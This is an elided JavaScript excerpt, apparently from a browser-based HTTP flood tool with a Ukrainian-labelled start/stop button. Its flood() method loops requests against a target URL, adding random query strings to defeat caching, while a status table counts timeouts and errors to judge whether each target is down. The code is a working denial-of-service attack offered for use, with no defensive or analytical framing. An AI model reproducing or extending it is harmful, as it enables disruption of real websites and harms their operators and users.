...
class StatusTable {
    ...
    targetTimeoutUpdate(target) {
        let tarInfo = this.targetInfoFields[target]
        tarInfo.timeoutCount++

        if ((tarInfo.reqCount / tarInfo.timeoutCount) > this.TARGET_TIMEOUT_THRESHOLD && tarInfo.isDown === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING && tarInfo.errCount !== 0) {
...
class FIGHT {
    ...
    constructor() {
        this.statTable = new StatusTable("parentDivID")
    ...
    attackToggle() {
        ...
        if (this.attacking) {
            ...
            button.classList.remove("btn-stopped")
        } else {
            button.innerText = "Продовжити"
            button.classList.add("btn-stopped")
        }
    }
    ...
    async flood(target) {
        ...
        while (this.attacking) {
            ...
            let rand = counter % 3 === 0 ? '' : ('?' + Math.random() * 1000)
            this.queue.push(this.fetchWithTimeout(target + rand, {timeout: 2000}).catch((error) => {
                this.statTable.targetTimeoutUpdate(target)
            }).then((response) => {
                if (response && !response.ok) {
                    this.statTable.targetErrUpdate(target)
                }
